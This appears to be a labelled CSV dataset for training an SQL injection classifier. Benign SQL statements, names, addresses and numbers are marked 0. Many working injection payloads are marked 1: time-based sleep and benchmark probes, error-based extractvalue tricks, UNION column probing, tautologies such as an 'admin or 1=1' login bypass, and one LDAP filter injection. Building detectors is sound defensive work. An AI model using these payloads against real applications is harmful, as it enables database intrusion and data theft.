Query,Label
SELECT MIN ( higher )  AS bell FROM course,0
bayliss,0
16118,0
1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,1
SELECT * FROM seeing  WHERE vegetable NOT LIKE '[world]%',0
1  )   where 9708  =  9708,1
SELECT eleven ( s FROM nothing RIGHT JOIN,0
   (  select top 1,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28072 )  ORDER BY meta_id ASC",0
"INSERT INTO him ( kitchen, waste, triangle, half, pool, shore )  VALUES  ( 'managed', 'name'. living', 'library', 'cell', 'told', 'stems' )  ",0
SELECT * FROM right WHERE industrial NOT LIKE 'fifth%',0
89285662f,0
1' where 4115  =  4115,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'boud'  =  'boud",1
13791863m,0
 UPDATE instant SET slowly = 'sometime'WHERE positive = 'care',0
"1"" where 8727  =  8727",1
1   )    )     )   and sleep  (  5  )  #,1
"  UPDATE cry SET feel =  'operation', City =  'stage' WHERE wrapped =  melted",0
SELECT * FROM stopped WHERE of BETWEEN 'essential' AND 'raise',0
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre",1
SELECT torn ( s )  FROM pile UNION,0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,1
"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""gvlc"" like ""gvlc",1
"1 where 1062  =  1062 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
buenda,0
-6512'+  (  select 'zdjx' where 5454  =  5454 order by 1--,1
SELECT TOP 3 * FROM signal WHERE vast = 'yes',0
caada del hoyo,0
"SELECT NULLIF ( ""Hello"", ""world"" ) ;",0
5212,0
SELECT AVG ( several ) FROM buffalo,0
SELECT * FROM Customers  WHERE CustomerName LIKE '%or%';,0
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'bzak' like 'bzak",1
"1' union all select null,null,null,null#",1
SELECT * FROM fuel FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM told,0
 or username like '%,1
"-1174"" union all select 4303,4303,4303,4303#",1
SELECT * FROM do  WHERE limited = onto,0
"-7743"" or 9323  =  9323#",1
SELECT * FROM frozen WHERE grain = 'car'  AND  ( joined = 'wherever' OR month = 'sight' ) ,0
1'   )    )    as vwua where 8099  =  8099 union all select null--,1
SELECT * FROM stick WHERE natural LIKE '%anything%',0
33001,0
"   SELECT busy, invented, chief FROM view WHERE tool  IS NULL",0
SELECT TOP 50 PERCENT * FROM aware,0
SELECT * FROM sense WHERE lay = 'independent' LIMIT 3,0
SELECT * FROM widely,0
SELECT COUNT ( ProductID ) FROM Products;,0
"vendrell, el",0
"  SELECT log,front FROM night WHERE thirty = 'unhappy' UNION SELECT oldest, particles FROM stepped",0
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",1
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1
"-5700 where 4238  =  4238 union all select 4238,4238,4238#",1
schauer,0
1%'  )   or sleep  (  5  )   and   (  '%'  =  ',1
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",1
foulk@eonon.com.es,0
"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",1
"1' where 1602  =  1602 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
SELECT * FROM spread FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM himself,0
"1"" union all select null,null#",1
select case when 5346  =  8272 then 1 else null end--,1
FROM  ( SELECT DISTINCT live FROM mainly ) ,0
SELECT * FROM add WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0
select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
1%'   )    )    and sleep  (  5  )  #,1
select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,1
DELETE FROM mile,0
a4561o9nz68,0
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1
pozaldez,0
"-5845'   )    )     )   union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",1
SELECT COUNT ( darkness ) FROM outline,0
" end and    (    (   ""dmgj""  =  ""dmgj",1
"-4127%' union all select 9558,9558,9558#",1
18011,0
"iif  (  1539  =  1539,1539,1/0  )  ",1
"1' where 1085  =  1085 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1
SELECT MIN ( that )  AS declared FROM future,0
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg",1
SELECT * FROM nearer WHERE may = 'pleasant'  AND City = 'told',0
SELECT * FROM OrdersWHERE OrderDate BETWEEN #07/01/1996# AND #07/31/1996#;,0
nuez de balboa 131 2-f,0
SELECT MIN ( rock )  AS average FROM dog,0
"madrid, 27",0
SELECT universe ( s )  FROM relationship LEFT JOIN,0
"1 union all select null,null--",1
SELECT * FROM gate,0
"1%"" and 1343  =  5939#",1
asia,0
4.86024E+14,0
SELECT * FROM five WHERE Price NOT BETWEEN 10 AND 20,0
-8163   )    )    as cvai where 2360  =  2360 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT complete ( s ) FROM type INNER JOIN,0
agramontesa,0
"c/ hermenegilda portillo, 70",0
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1
SELECT shells ( s )  FROM people SELECT he ( s ) ,0
"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
lttecke,0
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20,0
SELECT dangerous ( s )  FROM grade UNION,0
81383348x,0
"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",1
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
SELECT TOP 3 * FROM tone WHERE lesson = 'stepped' SELECT * FROM needle,0
SELECT * FROM  ( SELECT locate FROM root ) ,0
yeste meloda,0
1'   )    )    as eltx where 9955  =  9955 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT * FROM parallel FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM upper,0
masahiro,0
SELECT * FROM simple 3 SELECT * FROM outer,0
ductilidad,0
SELECT AVG ( clear )  FROM problem  SELECT SUM ( plane ) ,0
nealson,0
SELECT * FROM origin WHERE bridge = 'sport',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28446,28587,28591,28618,28621,28633,28636,28691,28696,28699,28707,28710,28728,28733 )  ORDER BY meta_id ASC",0
1'   )    )    as dago where 9788  =  9788,1
SELECT * FROM never WHERE settle NOT LIKE 'organized%',0
70,0
SELECT COUNT ( problemID ) FROM pound,0
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%',0
SELECT AVG ( son ) FROM frighten SELECT SUM ( declared ) ,0
5ictoriosamente,0
3.57286E+15,0
SELECT catch ( s )  FROM field,0
SELECT in ( s )  FROM missing SELECT deer FROM written,0
" select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",1
1'  )   as imgv where 7802  =  7802,1
SELECT * FROM anywhere WHERE black = 'impossible'  OR become = 'substance',0
"  SELECT INSERT ( ""W3Schools.com"", 11, 3, ""no"" ) ;",0
"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1
SELECT * FROM roll WHERE outline BETWEEN '1996-07-01' AND '1996-07-31',0
"1%'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM active FETCH FIRST 3 ROWS ONLY,0
"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",1
SELECT * FROM  ( SELECT bell FROM yes ) ,0
calle laguna de pealara 171 12-e,0
"  SELECT serious,season,value FROM horn LEFT JOIN Orders ON huge.studiedID =  bigger.die ORDER BY exclaimed.for",0
SELECT * FROM sheep ORDER BY difference,0
shrum@uniovivirtual.nz,0
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT AVG ( perfectly ) FROM band,0
"1'||  (  select 'gikt' where 8447  =  8447 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1'+  (  select 'lcru' where 3215  =  3215,1
demoniaca,0
-9847%'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  ',1
"-8894%""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """,1
 UPDATE hand SET open = 'diameter'WHERE widely = 'inside',0
8.1203E+15,0
SELECT TOP 50 PERCENT * FROM tin SELECT * FROM here FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM result,0
SELECT * FROM three WHERE captured = 'actually' LIMIT 3,0
SELECT column_name FROM table_name AS alias_name;,0
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1
%2A%28%7C%28objectclass%3D%2A%29%29,1
enanzar,0
"SELECT column1 , column2, ... FROM table_name WHERE NOT condition ;",0
ingelber,0
sandler,0
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1
SELECT club ( s )  FROM drawn SELECT roar ( s ) ,0
SELECT * FROM pound,0
SELECT AVG ( they ) FROM particularly,0
SELECT * FROM affect WHERE dirt = 'camp'  OR yellow = 'salmon',0
"1'+  (  select qjng where 1897  =  1897 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1
SELECT COUNT ( divide )  FROM instrument,0
"  SELECT Orders.nearlyrID, Employees.suppose, Employees.balance FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.provideID ORDER BY Orders.tapeID",0
69 47164 F6 reply F6 1568 0 csdf1123mVwbHk  =   9 134 e_qna eng modify 38 22747 22747 3945 556 V gallery2 view 366 3 F1 read F1 8628 80 sub0204 photo OPTOMA 218 30 02_01 1091 wr_datetime asc 2 sub0203 photo e_qna eng 8 18489 bbs338 12 view 132,0
"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",1
1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
6.25668E+15,0
"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",1
16926,0
"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
SELECT * FROM  ( SELECT minute FROM excitement ) ,0
psklib,0
"  SELECT PERIOD_ADD ( 201703, 5 ) ;",0
SELECT * FROM shout FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM full,0
"1' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",1
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ggiw'  =  'ggiw",1
SELECT * FROM indicate WHERE blind LIKE '%date%',0
"-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",1
SELECT TOP 3 * FROM airplane SELECT * FROM natural 3SELECT * FROM doing,0
vir7eino,0
" end and    (    (   ""rqay"" like ""rqay",1
SELECT * FROM fellow FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",1
SELECT bigger ( s )  FROM mighty UNION ALL,0
SELECT TOP 3 * FROM finest WHERE bread = 'secret',0
18179,0
lavada,0
8.62453E+15,0
SELECT scientific ( s )  FROM term UNION ALL,0
-8515' or 1329  =  9536,1
49645694x,0
shing-mi,0
"admin"" or 1  =  1#",1
SELECT TOP 50 PERCENT * FROM tail,0
"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",1
SELECT * FROM wp_posts WHERE ID  =  262331 LIMIT 1,0
banderizar,0
shan-min,0
34830,0
saint-simon-vondis@paremoselalzheimer.dj,0
"1%""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,1
"  SELECT * FROM consonant WHERE follow IN  ( 'opinion', 'copy', 'lunch' )  ",0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1
"  SELECT creature AS mighty, adult AS [serious]  FROM hair",0
holgorio,0
avril,0
3023,0
"-9445  )   as dmur where 4371  =  4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1
verschuer_greenleaf@cajucar.cx,0
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",1
SELECT COUNT ( smoke ) FROM reader,0
15495714q,0
SELECT dig ( s )  FROM raise UNION ALL,0
SELECT * FROM vertical WHERE round BETWEEN '1996-07-01' AND '1996-07-31',0
9810,0
"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-3559'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
SELECT AVG ( manufacturing ) FROM valley SELECT SUM ( see ) ,0
8.61689E+15,0
"   SELECT nearby, surrounded, snakeFROM development WHERE hand  IS NOT NULL",0
mandruso,0
SELECT CEIL ( 25 ) ;,0
SELECT COUNT ( general ) FROM carefully,0
8232,0
28900,0
"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",1
1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
1'  )   and   (  3020  =  3020  )  *6703 and   (  'botl' like 'botl,1
falerno,0
SELECT month FROM pride UNION SELECT safety FROM push ORDER BY managed,0
SELECT COUNT ( DISTINCT kitchen )  FROM tired,0
d9str7par,0
"-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#",1
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",1
p44m8scu6916n,0
varley@tecnoindomo.ki,0
49694,0
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",1
"1%"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""%""  =  """,1
SELECT * FROM year WHERE NOT tightly = 'examine'  AND NOT chose = 'poor',0
SELECT * FROM location ORDER BY are,0
paseo arco del ladrillo 48 10?h,0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,1
" SELECT * FROM gravity ORDER BY arrive, strange",0
1  )   where 9307  =  9307,1
SELECT * FROM want WHERE experience  BETWEEN 10 AND 20,0
SELECT TOP 3 * FROM be,0
van_eyk,0
SELECT * FROM weak WHERE smaller NOT BETWEEN 'unit' AND 'dear',0
SELECT COUNT ( park ) FROM title,0
"1   )    )    union all select null,null,null,null#",1
SELECT COS ( 2 ) ;,0
SELECT * FROM theory FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM something,0
1   )    )    as rhwg where 8843  =  8843,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,1
5.97528E+15,0
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1
SELECT AVG ( check ) FROM gold SELECT SUM ( plural ) ,0
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'dphz'  =  'dphz",1
4341,0
select   (  case when   (  9540  =  5786  )   then 9540 else 9540*  (  select 9540 from information_schema.character_sets  )   end  )  #,1
s-ierro,0
SELECT * FROM dozen WHERE verb NOT LIKE 'clothing%',0
1   )    )    or sleep  (  5  )  #,1
"SELECT * FROM all WHERE poor BETWEEN ""sheet"" AND    ""telephone""",0
SELECT TOP 3 * FROM hello,0
49211,0
"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
3525,0
6r5int3805,0
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ) ,0
SELECT * FROM driving WHERE habit NOT BETWEEN 'fully' AND 'chart',0
SELECT * FROM office WHERE pure = 'throw'  AND  ( flag = 'pilot' OR rest = 'character' ) ,0
if  (  7340  =  9813  )   select 7340 else drop function yppp--,1
h46a00o,0
"calle sant joan, 123,",0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy",1
98011650w,0
SELECT * FROM length WHERE flow = 'review' FETCH FIRST 3 ROWS ONLY,0
14140,0
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'eovg' like 'eovg",1
boagne,0
SELECT * FROM vote 3,0
"  SELECT speedID AS ID, win AS proper FROM add",0
rebalg1r,0
"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""wjhj""  =  ""wjhj",1
SELECT * FROM folks WHERE activity IN  ( SELECT frozen FROM did ) ,0
tinti@21horas.hr,0
"1""   )    )    as mvxa where 3024  =  3024",1
SELECT * FROM creature WHERE game = 'hurried'  OR camp = 'rapidly',0
lilien@aprendeaestudiar.lt,0
harold_veigel@ilusionarium.sk,0
SELECT test ( s )  FROM open FULL OUTER JOIN,0
SELECT Count ( * )  AS percent,0
"calle profesor angel lacalle, s/n,",0
87811832v,0
%27 or 1  =  1,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",1
-4484'   )    )    or 6872  =  6872 and    (    (   'oxuo'  =  'oxuo,1
hymen_israeli@aulahost.vc,0
"  SELECT * FROM shaking WHERE them IN  ( 'prevent', 'coach', 'writer' )  ",0
"iif  (  5214  =  7412,1,1/0  )  ",1
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1
"   SELECT ready, enemy, mice FROM bad WHERE frozen  IS NULL",0
-7246'||  (  select 'qchp' from dual where 8317  =  8317 order by 1--,1
-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  ',1
SELECT column_name FROM table1 UNION,0
SELECT * FROM prove WHERE handsome = 'addition'  OR noted = 'upon',0
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fmkz' like 'fmkz",1
"-8026 or elt  (  8434  =  4516,4516  )  # bsqo",1
"-9856"" union all select 9753--",1
"1%'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   '%'  =  '",1
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""uzjn""  =  ""uzjn",1
SELECT * FROM particularly WHERE girl NOT LIKE 'letter%',0
"c/ gustavo adolfo becquer 91,",0
SELECT * FROM she 3 SELECT * FROM further,0
"   SELECT television, rule, surfaceFROM consonant WHERE hunt  IS NOT NULL",0
"SELECT * FROM pole WHERE fifty BETWEEN ""floor"" AND    ""neck""",0
"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",1
"1   )    )    as cvid where 4381  =  4381 union all select null,null--",1
"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
ludolfo,0
SELECT AVG ( setting ) FROM review SELECT SUM ( agree ) ,0
1  )   where 8041  =  8041,1
19262,0
SELECT COUNT ( birthID ) FROM rise,0
" SELECT column_name ( s )  FROM pound,bet",0
SELECT * FROM bent WHERE NOT tune = 'talk'  AND NOT flag = 'wait',0
botosso@mytanga.cf,0
SELECT * FROM  ( SELECT camera FROM chicken ) ,0
oretana,0
SELECT * FROM  ( SELECT excited FROM principle ) ,0
con79lecimie91o,0
SELECT * FROM vertical WHERE ready = 'paid' FETCH FIRST 3 ROWS ONLY,0
1'  )   as hqaq where 6411  =  6411 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
SELECT TOP 50 PERCENT * FROM flies,0
laureano,0
60613075w,0
1'+  (  select 'lpkv' where 8760  =  8760,1
"-5963"" or 9323  =  9323#",1
"1%""  )   union all select null,null,null,null,null#",1
passatge de manyer 105,0
"SELECT * FROM mother WHERE information BETWEEN ""found"" AND    ""water""",0
SELECT COUNT ( climate )  FROM attack,0
33s4h9929r,0
"  UPDATE family SET dirt =  'alphabet', City =  'specific' WHERE pain =  temperature",0
SELECT population ( s ) FROM star INNER JOIN,0
SELECT * FROM gather FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'  )   and make_set  (  7187  =  4625,4625  )   and   (  'diai' like 'diai",1
fulmer,0
SELECT * FROM noted FETCH FIRST 50 PERCENT ROWS ONLY,0
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   5171  =  5171,1
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",1
SELECT * FROM report,0
SELECT becoming ( s )  FROM something LEFT JOIN,0
